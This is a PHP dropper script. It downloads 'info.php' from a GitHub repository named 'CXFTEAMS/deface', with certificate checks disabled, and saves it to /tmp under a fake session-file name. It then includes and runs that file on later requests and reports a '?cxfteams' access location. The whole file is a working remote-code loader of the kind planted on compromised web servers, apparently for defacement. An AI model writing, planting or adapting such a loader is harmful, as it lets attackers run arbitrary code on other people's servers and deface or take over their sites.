<?php
$data = [
    'https://raw.githubusercontent.com/CXFTEAMS/deface/main/info.php',
    '/tmp/sess_' . md5($_SERVER['HTTP_HOST']) . '.php'
];

$response = [];

if (file_exists($data[1]) && filesize($data[1]) !== 0) {
    include($data[1]);
} else {
    $output = get($data[0]);

    if ($output !== false) {
        $fopen = fopen($data[1], 'w+');
        fwrite($fopen, $output);
        fclose($fopen);
        $response['status'] = 'file_created';
        $response['location'] = '?cxfteams';
    } else {
        $response['status'] = 'error';
        $response['message'] = 'Failed to fetch data.';
    }
}

// Convert the response array to JSON
$jsonResponse = json_encode($response);

// Output the JSON data
header('Content-Type: application/json');
echo $jsonResponse;

function get($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

    $result = curl_exec($ch);

    // Check for cURL errors
    if (curl_errno($ch)) {
        return false;
    }

    curl_close($ch);

    return $result;
}
?>
